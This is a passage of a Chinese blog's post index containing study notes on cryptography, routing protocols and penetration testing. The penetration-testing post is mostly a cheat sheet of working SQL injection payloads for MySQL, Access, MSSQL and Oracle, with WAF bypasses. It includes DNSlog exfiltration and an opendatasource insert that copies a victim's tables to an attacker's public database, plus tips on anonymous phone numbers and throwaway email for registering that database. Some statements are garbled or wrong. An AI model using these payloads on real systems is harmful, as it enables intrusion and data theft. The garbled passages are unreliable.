\n非对称加密的典型算法就是RSA算法，也是使用最广泛的。还有DSA算法，ECC算法，DH算法。\n因为非加密的缺点是运算速度非常慢，比对称加密要慢很多。所以，在实际应用的时候，非对称加密总是和对称加密一起使用。假设小明需要给小红需要传输加密文件，他们首先交换了各自的公钥，然后：\n\n小明生成一个随机的AES口令，然后用小红的公钥通过RSA加密这个口令，并发给小红；\n小红用自己的RSA私钥解密得到AES口令；\n双方使用这个共享的AES阔领用AES加密通信。\n\n课件非对称加密实际上应用在第一步，即加密“AES口令”。这也是我们在浏览器中常用的HTTPS协议的做法，即浏览器和服务器先通过RSA交换AES口令，接下来双方通信实际上采用的是速度较快的AES对称加密，而不是缓慢的RSA非对称加密。\n以RSA算法为例，它的密钥有256/512/1024/2048/4096等不同的长度。长度越长，密码强度越大，当然计算速度也越慢。\n如果修改待加密的byte[]数据的大小，可以发现，使用512bit的RSA加密时，明文长度不能超过53字节，使用1024bit的RSA加密时，明文长度不能超过117字节，这也是为什么使用RSA的时候，总是配合AES一起使用，即用AES加密任意长度的明文，用RSA加密AES口令。\n此外，只使用非对称加密算法不能防止中间人攻击。\n签名算法如果使用私钥加密，公钥解密，私钥加密得到的密文实际上就是数字签名，要验证这个签名是否正确，只能用私钥持有者的公钥进行解密验证。使用数字签名的目的是为了确认某个信息确实是由某个发送发发送的，任何人都不可能伪造消息，并且，发送方也不能抵赖。\n在实际应用的时候，签名实际上并不是针对原始消息，而是针对原始消息的哈希进行签名，即：\nsignature &#x3D; encrypt(privateKey, sha256(message))\n\n对签名进行验证实际上就是对公钥解密：\nhash &#x3D; decrypt(publicKey, signature)\n\n然后把解密后的哈希与原始消息的哈希进行对比。\n因为用户总是使用自己的私钥进行签名，所以，私钥就相当于用户身份。而公钥用来给外部验证用户身份。\n常用数字签名算法有：\n\nMD5withRSA\nSHA1withRSA\nSHA256withRSA\n\n他们实际上就是指定某种哈希算法进行RSA签名的方式。\n使用其他公钥，或者验证签名的时候修改原始信息，都无法验证成功。\nDSA签名除了RSA可以签名外，还可以使用DSA算法进行签名。DSA是Digital Signature Algorithm的缩写，它使用ElGamal数字签名算法。\nDSA只能配合SHA使用，常用的算法有：\n\nSHA1withDSA\nSHA256withDSA\nSHA512withDSA\n和RSA数字签名相比，DSA的优点是更快。\n\nECDSA签名椭圆曲线签名算法ECDSA：Elliptic Curve Digital Signature Algorithm也是一种常用的签名算法，它的特点是可以从私钥推出公钥。比特币的签名算法就采用了ECDSA算法，使用标准椭圆曲线secp256k1。BouncyCastle提供了ECDSA的完整实现。\n小结：数字签名就是用发送方的私钥对原始数据进行签名，只有用发送方公钥才能通过签名验证。\n数字签名用于：\n\n防止伪造\n防止抵赖\n检测篡改\n\n常用的数字签名算法包括：MD5withRSA／SHA1withRSA／SHA256withRSA／SHA1withDSA／SHA256withDSA／SHA512withDSA／ECDSA等。\n数字证书摘要算法用来确保数据没有被篡改，非对称加密算法可以对数据进行加解密，签名算法可以确保数据完整性和抗否认性，把这些算法集合到一起，并搞一套完善的标准，这就是数字证书。\n因此，数字证书就是集合了多种密码学算法，用于实现数据加解密、身份认证、签名等多种功能的一种安全标准。\n数字证书可以防止中间人攻击，因为它采用链式签名认证，即通过根证书（Root CA）去签名下一级证书，这样层层签名，知道最终的用户证书。而Root CA证书内置于操作系统中，所以，任何经过CA认证的数字证书都可以对其本身进行校验，确保整数本身不是伪造的。\n我们在上网时常用的HTTPS协议就是数字证书的应用。浏览器会自动验证证书的有效性。\n要使用数字证书，首先需要创建证书。正常情况下，一个合法的数字证书需要经过CA签名，这需要认证域名并支付一定的费用。开发的时候，我们可以使用自签名的证书，这种证书可以正常开发调试，但不能对外作为服务使用，因为其他客户端并不认可未经CA签名的证书。\n注意：数字证书存储的是公钥，以及相关的证书链和算法信息。私钥必须严格保密，如果数字证书对应的私钥泄露，就会造成严重的安全威胁。如果CA证书的私钥泄露，那么该CA证书签发的所有证书将不可信。\n小结：数字证书就是集合了多种密码学算法，用于实现数据加解密、身份认证、前民等多种功能的一种安全标准。\n数字证书采用链式签名管理，顶级的Root CA证书已内置在操作系统中。\n数字证书存储的是公钥，可以安全公开，而私钥必须严格保密。\n","slug":"加密与安全","date":"2022-10-24T07:35:31.000Z","categories_index":"","tags_index":"加密","author_index":"kiku"},{"id":"76925a97c21ef31b084f9a5256583291","title":"基础路由协议","content":"关于RIP、OSPF和BGP背景路由器最重要的两个功能就是路由和转发，常见的路由算法有三种：RIP、OSPF和BGP。\n静态路由算法（非自适应路由算法）：管理员手工配置路由信息。\n优点：简便、可靠，在负荷稳定、拓扑变化不大的网络中运行效果很好，广泛用于高度安全性的军事网络和娇小的商业网络。\n缺点：路由更新慢，不适合大型网络。\n动态路由算法（自适应路由算法）：路由器间彼此交换信息，按照路由算法优化出路由表项。\n优点：路由更新快，适用大型网络，及时相应链路费用或网络拓扑变化。\n缺点：算法复杂， 增加网络负担。\n全局性链路状态路由算法：所有路由器掌握完整的网络拓扑和链路费用信息。如OSPF。\n分散性距离向量路由算法：路由器只掌握物理相连的邻居及链路费用。如RIP。\n但是由于因特网规模很大，以及许多单位不想让外界知道自己的路由选择协议，但还想连入因特网的情况存在，出现了另一种算法BGP。\n自制系统AS：在单一的技术管理下的一组路由器，而这些路由器使用一种AS内部的路由选择协议和共同的度量以确定分组在该AS内的路由，同时还是用一种AS之间的裸游协议以确定在AS之间的路由。一个AS内的所有网络都属于一个行政单位来管辖，一个自治系统的所有路由器在本自治系统内部必须连通。\nRIPRIP是一种分布式的基于距离向量的路由选择协议，是因特网的协议标准，最大优点是简单。RIP协议要求网络中每一个路由器都维护从它自己到其他每一个目的网络的唯一最佳距离纪录（即一组距离）。\n距离即跳数，即从源端口到目的端口所经过的路由器个数，经过一个路由器跳数+1。特别的，从一路由器到直接连接的网络距离为1。RIP允许一条路由最多只能包含15个路由器，因此距离为16表示网络不可达。\nRIP只适用于小互联网。\n特点：\n仅和相邻路由器交换信息。\n路由器交换的信息是自己的路由器。\n每30秒交换一次路由信息，然后路由器根据新信息更新路由表。若超过180s没收到邻居路由器的通告，则判定邻居没了，并更新自己路由表。\n路由器刚开始工作时，只知道连接的网络的距离，接着每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息。经过若干次更新后，所有路由器最终都会知道到达本自治系统任何一个网络的最短距离和下一条路由器的地址，即“收敛“。\n当网络出现故障时，要经过比较长的时间（例如数分钟）才能将此信息传送到所有的路由器，“慢收敛“。\nRIP是一种分布式的基于距离向量的内部网关路由选择协议，通过广播UDP报文来交换路由信息。\n\nOSPF开放最短路径有限OSPF协议：开放表明OSPF协议不是受某一家厂商控制，而是公开发表的。最短路径是因为使用了Dijkstra提出的最短路径算法SPF。OSPF最主要的特征就是使用分布式的链路状态协议。\n特点\n使用洪泛法向自制系统内所有路由器发送消息，即路由器通过输入端口向所有相邻的路由器发送信息，而每一个相邻路由器又再次将此信息发往其所有的相邻路由器（广播）。最终整个区域内所有路由器都得到了这个信息的一个副本。\n发送的信息就是与本路由器相邻的所有路由器的链路状态（本路由器和哪些路由器相邻，以及该链路的度量/代价–费用 、距离、时延、带宽等）。\n只有当链路状态发生变化时，路由器才向所有路由器洪泛发送此消息。最后，所有路由器都能简历一个链路状态数据库，即全网拓扑图。\n每隔30min，要刷新一次数据库中的链路状态。\n由于一个路由器的链路状态只涉及到与相邻路由器的连通状态，因而与整个互联网的规模并无直接关系。因此当互联网规模很大时，OSPF协议要比距离向量协议RIP好得多。\nOSPF不存在坏消息传的慢的问题，它的收敛速度很快。\nOSPF的数据包有五种，分别是Hello包，DBD包、LSR、LSU、LSACK\nOSPF状态机一般有七个，分别是down、init、two-way、exstart、exchange、loading、full\nOSPF选路规则有伍哥认为控制的只有cost。\nOSPF建邻居条件很多，有0个。\nOSPF属于IGP协议，追求的是收敛快、选路佳、占用资源少。\nOSPF的防患机制主要依靠它的算法本身还有区域间水平分割等。\nOSPF是一个内部网络协议，要交换的信息量较大，应使报文的长度尽量短，所以不使用传输层协议（如UDP或TCP），而是直接采用IP。\n\nBGPBGP协议描述了如何与其他AS的邻站BGP发言人交换信息，交换的是网络可达性的信息，即要到达某个位置索要经过的一系列AS，发生变化时需要更新有变化的部分。\nBGP支持CIDR，因此BGP的路由表也就应当包括目的网络前缀、下一条路由器，以及到达该目的网络所要经过的各个自制系统序列。\n在BGP刚刚运行时，BGP的邻站是交换整个的BGP路由表。但以后只要需要在发生变化时更新有变化的部分，这样做对节省网络贷款和介绍路由器的处理开销都有好处。\nBGP是应用层协议，借助TCP传送。\n一个BGP发言人与其他自治系统中的BGP发言人要交换路由信息，就要先简历TCP连接，即通过TCP传送，然后在此连接上交换BGP报文以简历BGP会话，利用BGP会话交换路由信息。\nBGP报文种类\nOPEN报文：用来与相邻的另一个BGP发言人建立关系，并认证发送方。\nUPDATE报文：通告新路径或撤销原路径。\nKEEPALIVE报文：在无UPDATE时，周期性证实邻站的连通性；也作为OPEN的确认。\nNOTIFICATION报文：报告先前报文的差错；也被用于关闭连接。\n\nBGP的状态机有六个，分别是Idle、Connect、Active、Opensent、Openconfirm、Establish\nBGP选路规则有十二个，管理员可以灵活地控制\nBGP的建邻只需要邻居间可达、路由表中有邻居路由即可\nBGP属于EGP，追求的是可靠性、可控性强，还有就是以一个AS为一跳，即AS-BY-AS\nBGP的防环机制主要有IBGP水平分割和EBGP水平分割。\nBGP是一个外部网络协议，在不同的自治系统之间交换路由信息，由于网络环境复杂，需要保证可靠传输，所以采用TCP。\n","slug":"基础路由协议","date":"2022-10-12T15:51:50.000Z","categories_index":"基础路由协议","tags_index":"路由协议,网络","author_index":"kiku"},{"id":"2036d833eadf7ac7f2f1d4187b2dc9e7","title":"渗透学习总结","content":"一、信息收集信息收集收集的是什么：whois信息；子域名；端口探测；目录扫描；指纹识别；旁站查询；C段查询；内容敏感信息泄露\n使用的工具：谷歌镜像站：使用谷歌语法进行搜索\n网络空间搜索引擎：FOFA、钟馗之眼、撒旦。直接搜索网络中的主机或其他网络设备，显示主机的IP、端口、中间件、摄像头、工控设备banner等其它网络设备信息。其他网络设备：路由器、智能电视、联网设备。\n子域名：子域名挖掘机。\n端口探测：nmap。一些危险端口：445(TCP共享服务   SMB服务)、3306(mysql默认端口)、22(ssh登录端口)、1433(SQL Server默认端口)、6379(redis服务器的端口)\n目录扫描：御剑。有些网站可能某个目录下是一个新的网站，比如用phpstudy搭建的网站\n指纹识别：云悉。CMS可能存在通杀漏洞\n旁站查询：旁站指的是同一个ip上有多个网站，如果成功拿下旁站，有可能和主站在同一台机器。\nC段查询：有些学校或大公司，会持有整个IP段，这个IP段中所有的ip都是那个公司的资产。\n内容敏感信息泄露：使用谷歌语法，找到某些敏感内容，比如包含身份证号的表格、包含服务器账号密码的文件、某些敏感文件、备份数据库。\n有些使用了CDN（内容分发网络）的网站，直接看到的ip很可能不是真实的，需要绕过CDN。\n绕过CDN：内部邮箱源：一般邮件系统都在系统内部，没经过CDN，通过注册或者RSS订阅收到的邮件查找（必须是目标自己的邮件服务器）。\n子域名：一般网站主站访问量过大需要挂CDN，而子站就没有。\n国外访问：一般国内cdn只针对国内用户，国外不好说。\n查询域名的解析记录：https://www.netcraft.com   也许目标很久以前没用过CDN，而在网络中还保存着。\n端口状态：open：开放的\nclose：关闭的\nFiltered：被过滤的。意味着防火墙，过滤器或者其它网络障碍阻止了该端口被访问，Nmap 无法得知它是 open（开放的） 还是 closed（关闭的）。 \nunfiltered：未被过滤的。未被过滤状态意味着端口可访问但是nmap无法确定它是开放的还是关闭。\nopen|filtered：开放或被过滤的\nclosed|filtered：关闭或被过滤的\n信息收集的关键就是域名和IP\n二、SQL注入注入的本质：把用户输入的数据当做代码执行。\n1、按注入点数据类型分类：1.数字型注入没有闭合，测试时使用and 1=1和and 1=2或者or 1=1和or 1=2，对比响应结果是否一致，一致则可能存在数字型注入。\n2.字符型注入测试时需要考虑闭合，单引号、双引号和括号\n3.搜索型注入测试时需要用“%”来进行闭合。\n2、按照数据提交方式分类1.get注入数据以get方式进行提交。注入点一般在get提交的url后，可以通过bp抓包进行查找\n2.post注入数据以post方式进行提交。注入点一般在表单的填写出，可以通过bp抓包进行查找。\n3.head头注入（http头注入）user-agent:判定用户使用的操作系统，以及使用的浏览器的版本\ncookie:判定用户的身份，进行session跟踪可以存储在用户本地终端上的数据，简单理解为用户的一张身份辨别卡\nx-forwarded-for:是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段\nclient-ip: 数据库保存客户端IP的参数\nrerferer:浏览器向web端表明自己从哪个连接而来\nhost:客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号\nhead头注入需要：盲注和报错注入结合使用。\nmysql数据库致命性报错函数：updatexml()：更新xml文档的函数\n语法：updatexml(目标xml内容，xml文档路径，更新的内容)\n还需要知道concat()：拼接字符串的函数\n\n例：or updatexml(123,concat(&#39;~&#39;,(select database())),123) -- qwe\n~可以使用0x7e，因为mysql支持16进制，而且单引号通常会被过滤\nor updatexml(123,concat(0x7e,(select database())),123) -- qwe\n\n在这里使用or不行就换and\n报错注入需要一个字段一个字段的拿\n\n3、按照执行效果分类1.盲注特点：盲注在于无法构造出回显时使用，适合绝大部分注入点，比较费时费力，高频率访问容易被ban。\n分类：布尔盲注，时间盲注，dnslog盲注（MySQL）\n①布尔盲注特点：以页面回显的内容的不同作为判定依据\nid&#x3D;1 and 1&#x3D;1\nid&#x3D;1 and 1&#x3D;2\nand length(database())&gt;12 -- qwe\t\t\nand length(database())&lt;13 -- qwe\t\t#页面正常，则数据库名有12个字符\nand substr(database(),1,1)&#x3D;a -- qwe\t\t#页面正常，则数据库名的第一个字符为“a”\t\tsubstr()：截取字符串\nand ascii(substr(databse(),1,1)) -- qwe\t#用字符的ascii码来缩小查找范围\t\t\tascii()：返回字符串的ascii码，将字符变为数字\n\n②时间盲注特点：以回显的时长来作为判断依据\nid&#x3D;1 and sleep(2) -- qwe\nid&#x3D;1 and if(ascii(substr(database(),1,1))&#x3D;10,sleep(5),1) -- qwe\t\t#页面正常，则数据库名的第一个字符就是ascii码为10所代表的那个字符\n\n③dnslog盲注特点：必须是windows系统，必须是root权限\n需要使用到load_file()：读取文件的函数，仅限mysql函数\ndnslog平台：dnslog.cn\n但是load_file()函数默认是不支持的，需要修改mysql文件夹下的my.ini文件，在文件最后一行加上“**secure_file_priv=**”，即secure_file_priv为空。\nUNC路径：windows的SMB服务，linux默认没有SMB服务的，所以要求windows系统，但是linux也可以安装SMB服务。\nid&#x3D;1 and 1&#x3D;(select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select database()),&#39;.这里是从dnslog平台获得的域名&#39;)))\n\n\n\napache解析特性，你对1.txt/jpg/png/gif/zip?id=1这些文件传参没什么用，WAF也会认为这个东西是安全的\nhttp:127.0.0.1:8080&#x2F;1.php&#x2F;123.txt\t\t#它会检测123.txt文件存不存在，若不存在则访问他的上级，即1.php，是一个绕过waf的方法。\n\nid&#x3D;1 and 1&#x3D;(select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select database()),&#39;.这里是从dnslog平台获得的域名&#x2F;&#x2F;abc&#39;)))\t#abc是要查找的文件夹，写什么都行，主要为了绕过waf，sql查询的结果会出现在dnslog平台\n\n\n\n写文件函数\ninto outfile    ‘路径’\ninto dumpfile ‘路径’\n2、报错注入特点：经过精心构造的函数，让函数处理user()等不合规定的数据，引发mysql报错。最常用的是updatexml()，报错函数有很多\n优点：报错注入优点是注入位置广泛，几乎任何和数据库有关的操作经过sql拼接都可以产生报错注入，有回显位，获取数据方便。\n缺点：缺点是必须开启错误提示，mysqli_error()\n1.floor\nid&#x3D;1 and \n(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group\nby x)a);\n\n2.extractvalue()\n\nid&#x3D;1 and\n(extractvalue(1,concat(0x7e,(select user()),0x7e)));\n\n3.updatexml()\n\nid&#x3D;1 and (updatexml(1,concat(0x7e,(select\nuser()),0x7e),1));\n\n4.geometrycollection()\n\nid&#x3D;1 and geometrycollection((select *\nfrom(select * from(select user())a)b));\n\n5.multipoint()\n\nid&#x3D;1 and multipoint((select * from(select\n* from(select user())a)b));\n\n6.polygon()\n\nid&#x3D;1 and polygon((select * from(select *\nfrom(select user())a)b));\n\n7.multipolygon()\n\nid&#x3D;1 and multipolygon((select *\nfrom(select * from(select user())a)b));\n\n8.linestring()\n\nid&#x3D;1 and linestring((select * from(select\n* from(select user())a)b));\n\n9.multilinestring()\n\nid&#x3D;1 and multilinestring((select *\nfrom(select * from(select user())a)b));\n\n10.exp()\n\nid&#x3D;1 and exp(~(select * from(select\nuser())a));\n\n\n3、显错注入——联合查询特点：联合注入使用了union select联合查询，常用来拼接在where后面，并且通过报错的方式显示显位\n优势：联合注入通过显位的方式可以快速的爆出数据\n缺点：缺点是只能用在select最后处，后面如果还有sql语句就必须注释掉。并且必须用到union和select两个关键字，并且这两个关键字也很容易被拦截\n联合查询的核心需要满足：两个查询语句的结果集字段数必须相同。\n关键函数：union select、group_concat\nmysql数据库中高于5.0版本的都有一个系统自带库：\ninformation_schema\n\n库里面有两张表：\ninformation_schema.tables\t\t#存放表名和库的对应\ninformation_schema.columns\t\t#存放字段名和表名的对应\n\nsql语句\nselect * from news where id&#x3D;1;\n#判断字段数，即列数\nselect * from news where id&#x3D;1 order by 1\t\t\t#通过替换1和页面显示正确与否来判断有几个字段\n#判断输出点\nselect * from news where id&#x3D;-1 union select 4789,5789\t\t\t#例如判断出有2个字段，这样传参之后页面显示4789或5789则是可以显示的点\n#通过输出点输出数据库名\nselect * from news where id&#x3D;-1 union select database(),2,3,4\n#通过输出点来输出表名\nselect * from news where id&#x3D;-1 union select 4789,table_name from information_schema.tables where table_schema&#x3D;database()\t#通过可以回显的这个点来判断表名\n#输出字段名\nselect 8 from news where id&#x3D;-1 union select 4789,column_name from information_shcema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;admin&#39;\t\t\t#假如表名为admin\n#通过limit 1,1&#x2F;limit 2,1 查看有哪些字段名\nselect 8 from news where id&#x3D;-1 union select 4789,column_name from information_shcema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;admin&#39; limit 1,1\t\t#假如判断出一个字段名为uname\nselect 8 from news where id&#x3D;-1 union select 4789,uname from admin\n\n如果遇到字符型传参，则需要进行闭合和注释\n闭合：一般会出现小括号，单引号，双引号这些，需要逐个进行尝试才能知道\n注释可以用：%23代表的就是#，但是#只适用于mysql。也可以用-- qwe，它可以注入部分的数据库语句\n\n4、宽字节注入特点：\n\n字符注入的时候我们需要逃逸闭合。php提供了魔术引号开关magic_quotes_gpc和addslashed()，iconv()这些函数来进行防御，魔术引号会将我们的闭合，例如单引号和双引号这些前面加上一个反斜杠，进行转义，使闭合失效。\n如果数据库是GBK编码而非默认的UTF-8编码，我们就可以利用传参一个字符和进行转义的反斜杠组合成一个汉字，从而解决魔术引号的反闭合。\n宽字节sql注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入\n\nurl编码的核心是16进制\nget传参的注入：\n\\所对应的url编码为%5c对应的十六进制就是5c\n&#39;所对应的url编码为%27\n跟%5c能组成汉字就能进行宽字节注入，例如：\n“%d5%5c”所代表的就是汉字“诚”，即%d5%5c&#x3D;0xd50x5c&#x3D;诚\n所有能和%5c组成汉字的字符都可以使用，例如%aa\n\nSelect * from user where id&#x3D;&#39;1&#39;;\t\t#例如这是一个正常的url所对应的数据库的语句\nSelect * from user where id&#x3D;&#39;1%d5\\&#39;&#39; and 1&#x3D;1 -- qwe\t\t#%d5和反斜杠组成了汉字“诚”，所以后面的单引号就行进行闭合\n\n对于post传参的宽字节注入有两种方法：\n1、直接输入汉字来进行绕过就可以了\n例：诚&#39; or 1&#x3D;1 -- qwe\n2、输入一个a，然后用bp抓包，调到hex模式，找到所输入的那个a对应的16进制的代码为“61”，然后将61改为d5即可,然后放包\n\n5、Cookie注入——Access注入Cookie注入不仅仅存在于Access数据库中，这里以Access数据库为例。\nAsp站遇到Cookie注入的几率大一些\n在动态语言中存在超全局变量可以获取多种传参方式（基本上），很多时候开发在开发的时候为了考虑到多种接收参数，在接收参数的时候都用多种解释传参的方法。\n例：php中的$_REQUEST[]可以获取POST|GET|COOKIE传参\n注意：php5.4以上版本不接受Cookie传参\n使用场景：POST，GET传参时产生了拦截的时候可以使用Cookie传参。\n遇到拦截时，我们要思考应对的策略，如：\n①找个不拦截的东西（GET、POST、Cookie、Head里面分别进行传参尝试）；\n②寻找规则，知道它是怎么拦截的，然后进行绕过\nCookie注入只是传参点的不同，属于是head头注入的一种。\n设置Cookie的方法有三种：\n1.用bp抓包进行修改\nCookie:.........;id&#x3D;171\n\n2.浏览器插件Edit Cookie\nCookie需要URL编码和SQL注入没有区别。\nAccess数据库必须带表名，而且Access数据库没有系统自带库，所有就要强行猜解来猜测表名。\nCookie:.........;id&#x3D;171 and exists(select * from 表名)\t\t#若显示正常则存在该表，可以用burp来进行爆破表名。\n\n3.用js设置Cookie\nF12——&gt;Console\n记得将插件Edit Cookie关掉，会有影响。\ndocument.cookie&#x3D;&quot;id&#x3D;&quot;+escape(&quot;171 order by 10&quot;)\t\t#记得语句中有了171就要把url栏里面的?id&#x3D;171删掉。escape是一个编码函数，会进行一次url编码\n\n使用sqlmap跑cookie注入:\npy sqlmap.py -u url --cookie &quot;id&#x3D;171&quot; --level 2\t\t#url中的?id&#x3D;171记得删掉\n\n7、偏移注入——Access注入偏移注入使用场景：\n在知道表名，不知道字段名的情况下查询数据，就需要用到偏移注入\n首先，我们要知道：\n*：在数据库中代表一切\n库.表：表示选中这个库里面的这个表\nadmin.*：表示admin表中的所有字段\n\n之前的sql注入流程都相似，一直到猜不到字段名的时候才开始偏移注入\n#例如sql查到的表为admin表\n#但是当前网页所用到的表很可能不是admin表，例如是news表，那么就要判断news表中有多少个字段\ndocument.cookie&#x3D;&quot;id&#x3D;&quot;+escape(&quot;105 order by 10&quot;)\t\t\t\t#假设10显示正常，11显示异常，则news表中有10个字段\n#然后判断显错点\ndocument.cookie&#x3D;&quot;id&#x3D;&quot;+escape(&quot;105 union select 1,2,3,4,5,6,7,8,9,10 from admin&quot;)\t\t#假如显错点是3,5,7\n#注意显错点有的时候在页面中没有显示出来，可以使用F12查看源代码，源代码中有可能出现显错点\n#接下来就要判断admin表中有多少个字段\ndocument.cookie&#x3D;&quot;id&#x3D;&quot;+escape(&quot;105 union select admin.*,6,7,8,9,10 from admin&quot;)\t\t#通过不断删除多于admin字段的个数，显示正常后，假如admin有5个字段，假设这5个字段分别为a,b,c,d,e\n#则所代表的意思如下\ndocument.cookie&#x3D;&quot;id&#x3D;&quot;+escape(&quot;105 union select 1,admin.*,7,8,9,10 from admin&quot;)\t\t等价于\ndocument.cookie&#x3D;&quot;id&#x3D;&quot;+escape(&quot;105 union select 1,a,b,c,d,e,7,8,9,10 from admin&quot;)\n之后通过移动admin.*的位置，使admin表中更多的字段出现在显错点上，即可获取到部分字段名。\n\n偏移注入用sqlmap是跑不出来的\nAccess数据库不支持limit，limit是mysql独有的，但是Access支持top关键字，MSSQL数据库也支持top：\ntop 1 &#x3D;&gt;只取一条数据\ntop 2 &#x3D;&gt;只取两条数据\ndesc\t数据倒序排列，结合top 1\n可以取出之前排序最后的那条数据\n1,2,3,4,5,6,7,8,9,19\n10,9,8,7,6,5,4,3,2,1\n当使用倒序时，会根据那个小排前面，则输出小的\ntop 3 &#x3D;&gt;\t10,9,8  &#x3D;&gt;\t会显示8的数据\ntop 4 &#x3D;&gt;\t10,9,8,7&#x3D;&gt;\t会显示7的数据\n\n8、反弹注入——MSSQL注入使用场景：\n明明是SQL的注入点却无法进行注入，注入工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注入结果等，未解决以上这些疑难杂症，比较好的结局方法就是使用反弹注入技术，而反弹注入技术则需要依靠opendatasource函数支持\n反弹注入的核心：\nA数据库&#x3D;&gt;攻击者\nB数据库&#x3D;&gt;被攻击者\n让B数据库将查询获得的数据插入到A数据库中，即你建立的数据库。\n\n因此，我们需要一个在公网上的数据库。可以使用虚拟空间：\n\n香港云：http://www.webweb.com        申请一个30试用的\n\n注册需要使用邮箱可以使用临时邮箱：24mail.chacuo.net\n需要手机号的话可以使用匿名电话号：yunduanxin.net\n\n国外平台：https://my.gearhost.com/CloudSite        这个平台永远都不会删除你的数据。\n\n通过虚拟空间我们需要获得：\n数据库地址\t数据库名\t用户名\t密码\n然后使用navicat尝试连接，看能否使用\n\n反弹注入我们需要用到MSSQL显错注入。MSSSQL注入和MySQL注入有区别：\n#其一，联合查询最好都加上all，例：\nunion all select 1,2,3\n#其二，MSSQL对数据类型要求比较严格，所以填充位最好写null，然后将null换成数字或字母，一个一个试，通过显示正常来判断输出点的类型，例：\nunion all select null,null,null\n#其三，MSSQL的系统自带表为：\nsysobjects\t\tsyscolumns\t\t\t\n#information_schema也同样存在于MSSQL数据库中\n#其四，用户创建的表格在系统表中的类型都是U，可以通过xtype&#x3D;&#39;U&#39;来进行查找：\nselect * from sysobjects where xtype&#x3D;&#39;U&#39;\t\t#这句就可以看到用户所建立的表，其中每张表都对应的有一个独特的id\n#其五，输出点不可能输出一行数据，而是输出一个字段的数据\nselect name from sysobjects where xtype&#x3D;&#39;U&#39;\n\nunion all select id,name,5 from sysobjects where xtype&#x3D;&#39;U&#39;\t#通过这句可以查到所有用户创建的表还有所对应的id\nunion all select id,name,5 from syscolumns where id&#x3D;282822 -- qwe\t\t#假如查到字段名id,passwd,token,username\nunion all select null,passwd,token from admin\t\t-- qwe\n\ndbo是MSSQL数据库有关权限的，代表当前用户的权限\nopendatasource()：使用这个函数可以将当前数据库查询的结果发送到另一个数据库服务器中。\n语法：\nopendatasource(provider_name,init_string)\nprovider_name：注册为用于访问数据源的OLEDB提供数据库的PROGID的名称，一般是固定的，MSSQL的名称为 SQLOLEDB\ninit_string:连接字符串，server=连接地址、端口、uid用户名、pwd=密码、database=数据库名\n要进行反弹注入的两个表的字段数要相同，而且每个字段的类型也要一一对应。\n#假设数据库名为test,目标网站的表名为admin，那么就创建一个相同字段数的表temp\n&#39;; insert into opendatasource(&#39;sqloledb&#39;,&#39;server&#x3D;连接地址;1433;uid&#x3D;用户名;pwd&#x3D;密码;database&#x3D;test&#39;).test.dbo.temp select * from admin -- qwe\n\n堆叠注入：\n分号结尾原有的，然后创建新的语句（所有数据库都可能有），但是mysql少见\n例：select * from admin; select database()\t\t#数据库语句分号即结尾，但是堆叠注入的分号后的语句依旧会执行。\n\nMSSQL的延时函数与MySQL不同：\nseelct * from syscolumns where id&#x3D;1 waitfor delay &#39;0:0:3&#39;\t-- qwe\n\n9、堆叠注入特点：\n\n堆叠注入在MySQL数据库中不常见，常见于MSSQL，MSSQL数据库是默认堆叠注入的；\n堆叠注入必须要用到mysqli_multi_query()函数，可以使用分号分隔来执行多条语句，相当与可直连数据库；\n\nid&#x3D;1;select * from admin;\n\n10、Oracle注入——报错注入特点：\n\nOracle弱化了库的概念，强化了用户的概念，用户就是库；\ndual——&gt;虚表\n\n判断注入;\nurl?id&#x3D;1 and (select count (*) from user_tables)&gt;0 -- qwe\nurl?id&#x3D;1 and (select count (*) from dual)&gt;0 -- qwe\n\nutl_inaddr.get_host_name()进行报错注入\nand 1&#x3D;utl_inaddr.get_host_name((select user from dual))-- qwe\n\nctxsys.drithsx.sn()进行报错注入\nand 1&#x3D;ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum&#x3D;1)) -- qwe\t\t#这里的“1&#x3D;”不能省略，省略了用不了\n\nXMLType()进行报错注入\nand (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null -- qwe\n\ndbms_xdb_version.checkin()进行报错注入\nand (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null -- qwe\n\nbms_xdb_version.makeversioned()进报错注入\nand (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null -- qwe\n\ndbms_xdb_version.uncheckout()进行报错注入\nand (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null -- qwe\n\ndbms_utility.sqlid_to_sqlhash()进行报错注入\nand (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null -- qwe\n\n ordsys.ord_dicom.getmappingxpath()进行报错注入\nand 1&#x3D;ordsys.ord_dicom.getmappingxpath((select user from dual),user,user) -- qwe\n\ndecode进行报错注入\n这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法。\nand 1&#x3D;(select decode(substr(user,1,1),&#39;S&#39;,(1&#x2F;0),0) from dual) --\n\nOracle的系统自带库：\nselect * from all_tables \t\t#列出所有表\nselect * from user_tables\t\t#查询出当前用户的表\nselect * from all_tab_columns&#96;\t#查询出所有字段\nselect * from user_tab_columns\t#查询出当前用户的字段\nselct * from v$version\t\t\t#查版本\n\nOracle限制返回条数（与limit功能一样）：\nrownum &#x3D; 1\t\t\t#限制查询返回的总行数为一条，是Oracle数据库特有的\nselect * from admin where rownum&#x3D;1\t\t#一条数据\nselect * from admin where rownum&lt;3\t\t#两条数据\n\nOracle显错注入：\nadn 1&#x3D;1\nand 1&#x3D;2\norder by 1\n...\n...\nunion all select null,null,null,null from 